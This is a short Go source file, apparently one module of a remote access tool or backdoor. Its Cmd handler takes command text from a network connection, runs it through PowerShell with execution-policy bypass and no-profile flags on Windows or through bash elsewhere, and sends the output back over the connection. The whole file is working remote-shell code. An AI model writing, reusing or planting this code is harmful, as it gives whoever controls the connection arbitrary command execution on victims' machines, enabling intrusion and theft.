package actions

import (
  "net"
  "runtime"
  "os/exec"
  "strings"
)


func Cmd(conn net.Conn, args []string) {

	println("RUNNING CMD")

  command := strings.Join(args, " ")
	output := executeCommand(command)
	conn.Write([]byte(output))
}


func executeCommand(command string) string {

	// Execute the command and return the output
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("powershell", "-ep", "bypass", "-nop", "-nol", "-Command", command)
	} else {
		cmd = exec.Command("/bin/bash", "-c", command)
	}

	out, err := cmd.CombinedOutput()
	if err != nil {
		return err.Error()
	}
	return string(out)
}
